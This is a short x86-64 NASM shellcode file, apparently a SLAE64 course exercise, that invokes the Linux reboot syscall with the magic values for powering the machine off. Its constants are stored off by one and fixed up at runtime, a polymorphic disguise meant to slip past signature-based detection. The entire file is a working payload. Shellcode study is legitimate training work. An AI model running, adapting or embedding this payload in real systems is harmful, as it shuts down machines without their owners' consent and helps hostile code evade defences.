; Filename: shellcode2-polymorphic.nasm
; Author: SLAE64-14209
  
global _start           
section .text
_start:

	xor rax, rax
	mov al, 0xa9
	
	;mov edx, 0x4321fedc
	mov edx, 0x4321fedb
	inc dl
	
	;mov esi, 0x28121969
	mov esi, 0x28121968
	inc sil
	
	mov edi, 0xfee1dead
  syscall 
